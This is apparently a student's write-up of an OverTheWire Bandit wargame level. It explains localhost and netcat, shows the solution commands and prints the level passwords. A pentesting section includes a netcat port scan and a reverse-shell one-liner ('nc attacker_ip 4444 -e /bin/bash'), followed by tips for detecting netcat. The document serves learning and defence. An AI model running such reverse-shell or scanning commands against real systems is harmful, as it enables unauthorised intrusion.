# Bandit Level 14 → Level 15

## 🎯 Objective
The password for the next level can be retrieved by **submitting the current level's password to port 30000 on localhost**.

---

## 💡 Concepts Covered

### What is localhost?
**Localhost** (127.0.0.1) refers to the machine you are currently on. When a service listens on localhost, it is only accessible from the same machine — not from the outside network.

### What is Netcat (nc)?
**Netcat** is the "Swiss Army knife" of networking tools. It can:
- Connect to any port on any host
- Listen for incoming connections
- Send and receive data over TCP or UDP
- Create simple servers and clients

```bash
nc hostname port
```

### Connecting to localhost port 30000
```bash
nc localhost 30000
```
After connecting, type the password and press Enter. The server will validate it and return the next password.

### Alternative — Using echo with pipe
```bash
echo "password" | nc localhost 30000
```
This sends the password automatically without manual typing.

---

## 🔧 Solution

### Commands Used
```bash
cat /etc/bandit_pass/bandit14
nc localhost 30000
# Then typed the bandit14 password
```

### Steps
1. Logged in as `bandit14`
2. Read current password from `/etc/bandit_pass/bandit14`
3. Connected to localhost port 30000 using `nc`
4. Typed the bandit14 password and pressed Enter
5. Server validated the password and returned the next password

### What the Output Looks Like
```
bandit14@bandit:~$ nc localhost 30000
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
```

---

## 🧠 What I Learned

- `localhost` / `127.0.0.1` refers to the current machine
- `nc` (netcat) connects to any host and port and allows data exchange
- Services can listen on local ports — only accessible from the same machine
- Ports are how different services on the same machine are distinguished
- This is the same concept as how web servers listen on port 80/443

---

## 🔐 Cybersecurity Relevance

Netcat is one of the most important tools in cybersecurity:

**In pentesting:**
```bash
# Connect to a service
nc 192.168.1.1 80

# Listen for incoming connections (simple server)
nc -lvp 4444

# Reverse shell — attacker listens, victim connects back
# Attacker machine:
nc -lvp 4444
# Victim machine (after exploitation):
nc attacker_ip 4444 -e /bin/bash
```

**Reverse shells and C2:**
Netcat reverse shells are the most basic form of C2 communication — the compromised machine connects back to the attacker bypassing inbound firewall rules. This is the exact concept covered in the Firewalls section (C2 bypass).

**Port scanning with netcat:**
```bash
nc -zv 192.168.1.1 1-1000    # scan ports 1-1000
```

**In SOC — detecting netcat:**
- Unexpected `nc` process running on a system is a red flag
- Outbound connections to unusual ports from servers — possible reverse shell
- `nc` listening on high ports — possible backdoor

---

*Part of [Bandit Writeups](./README.md)*
